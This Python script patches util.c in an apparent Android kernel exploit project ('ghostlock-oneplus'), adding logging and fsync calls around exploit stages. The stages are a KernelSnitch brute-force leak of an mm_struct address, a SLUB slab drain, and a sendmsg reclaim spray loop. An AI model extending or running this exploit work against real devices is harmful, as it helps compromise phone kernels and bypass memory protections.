import re
util = "/root/ghostlock/ghostlock-oneplus/src/core/util.c"
u = open(util).read()

# 1) fsync helper (log durability across the panic)
if "static void log_sync(void)" not in u:
    anchor = "static long mm_slab_num_slabs(void) {"
    assert u.count(anchor) == 1
    u = u.replace(anchor, "static void log_sync(void) { fsync(1); }\n\n" + anchor)
    print("log_sync added")

# 2) print leaked offset within the slab
old = ("  pr_info(\"KernelSnitch bruteforce: state=%d found=%zu mm_struct=0x%zx\\n\",\n"
       "          ks->state, ks->found, leaked);")
new = ("  pr_info(\"KernelSnitch bruteforce: state=%d found=%zu mm_struct=0x%zx \"\n"
       "          \"off_in_slab=0x%zx\\n\",\n"
       "          ks->state, ks->found, leaked, leaked & (ORDER3_SIZE - 1));")
assert u.count(old) == 1, u.count(old)
u = u.replace(old, new)
print("leaked offset printed")

# 3) baseline slab count at function entry
old = "  skb_buf = malloc(SKB_SEND_SIZE);\n  memset(skb_buf, 0x41, SKB_SEND_SIZE);"
assert u.count(old) == 1
u = u.replace(old, "  pr_info(\"SLUB drain: mm_slabs entry=%ld\\n\", mm_slab_num_slabs());\n" + old)
print("entry slab count added")

# 4) log reclaim send results + fsync before return
old = ("  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {\n"
       "    errno = 0;\n"
       "    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);\n"
       "    if (sent <= 0) {\n"
       "      break;\n"
       "    }\n"
       "  }")
assert u.count(old) == 1, u.count(old)
new = ("  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {\n"
       "    errno = 0;\n"
       "    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);\n"
       "    pr_info(\"reclaim send[%d]=%zd errno=%d\\n\", i, sent, errno);\n"
       "    if (sent <= 0) {\n"
       "      break;\n"
       "    }\n"
       "  }")
u = u.replace(old, new)
print("reclaim send logs added")

# 5) fsync before return base (commits everything printed so far)
old = "  return base;\n}\n\nuintptr_t prepare_good_kernel_page"
assert u.count(old) == 1, u.count(old)
u = u.replace(old, "  log_sync();\n  return base;\n}\n\nuintptr_t prepare_good_kernel_page")
print("fsync before return")

open(util, "w").write(u)
print("done")
